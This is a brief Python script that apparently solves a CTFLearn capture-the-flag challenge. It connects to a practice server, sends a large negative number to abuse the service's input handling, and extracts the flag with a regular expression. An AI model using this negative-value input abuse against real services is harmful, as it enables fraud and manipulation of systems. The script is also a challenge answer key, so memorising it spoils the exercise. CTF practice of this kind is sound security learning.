#!/usr/bin/env python3

import re
import socket

def exploit(hostname, port, payload):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((hostname, port))
  sock.sendall(payload)
  sock.shutdown(socket.SHUT_WR)
  response = b''

  while True:
    chunk = sock.recv(1024)
    if chunk == b'':
      break
    response += chunk

  sock.close()
  return response


def main():
  payload = b'y\n-100000000\n'
  session = exploit('thekidofarcrania.com', 10001, payload).decode('utf8')
  flag = re.search('ctflearn{.*?}', session, flags=re.IGNORECASE).group()
  print(flag)


if __name__ == '__main__':
  main()
